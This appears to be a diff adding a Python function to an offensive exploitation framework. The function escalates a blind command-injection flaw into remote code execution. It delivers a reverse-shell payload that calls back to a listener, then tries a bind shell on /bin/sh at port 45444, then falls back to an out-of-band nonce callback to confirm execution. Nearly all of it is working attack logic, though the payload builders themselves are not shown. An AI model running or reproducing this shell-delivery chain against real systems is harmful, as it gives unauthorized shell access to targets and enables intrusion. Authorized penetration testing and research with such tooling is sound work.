@@ -216,3 +216,58 @@ class _Listener:
         finally:
             conn.close()
         return f"{nonce}-MARK".encode() in data
+
+
+import time
+
+
+def establish_rce(inject, target: str, *, service: str = "", nonce: str = "",
+                  bind_port: int = 45444, ladder_timeout: float = 8.0,
+                  _ip: str | None = None) -> Breach:
+    """Given a blind single-command `inject`, walk the delivery ladder until a breach.
+
+    Rung 1 reverse shell → Rung 2 bind shell → Rung 3 blind nonce callback. Returns the
+    first confirmed Breach; never raises for a non-breach."""
+    nonce = nonce or make_nonce()
+    lhost = _ip or local_ip_for(target)
+
+    # Rung 1: reverse shell — listener accepts the callback, confirm_shell probes it.
+    with _Listener(timeout=ladder_timeout) as lis:
+        try:
+            inject(reverse_payload(lhost, lis.port, nonce))
+        except Exception:
+            pass
+        conn = lis.accept_one()
+        if conn is not None:
+            br = confirm_shell(conn, service=service, nonce=nonce, timeout=ladder_timeout)
+            if br:
+                return br
+
+    # Rung 2: bind shell — target binds /bin/sh; we connect out and probe.
+    try:
+        inject(bind_payload(bind_port, nonce))
+    except Exception:
+        pass
+    deadline = time.time() + ladder_timeout
+    while time.time() < deadline:
+        try:
+            sock = socket.create_connection((target, bind_port), timeout=ladder_timeout)
+        except OSError:
+            time.sleep(0.4)
+            continue
+        br = confirm_shell(sock, service=service, nonce=nonce, timeout=ladder_timeout)
+        if br:
+            return br
+        break
+
+    # Rung 3: blind nonce callback — prove exec even with no usable shell.
+    with _Listener(timeout=ladder_timeout) as lis:
+        try:
+            inject(blind_callback_payload(lhost, lis.port, nonce))
+        except Exception:
+            pass
+        if lis.wait_for_nonce(nonce):
+            return Breach(confirmed=True, level="blind-rce", nonce=nonce,
+                          proof=f"{nonce}-MARK received out-of-band", exit_code="0")
+
+    return Breach(confirmed=False, level="none", nonce=nonce, proof="")
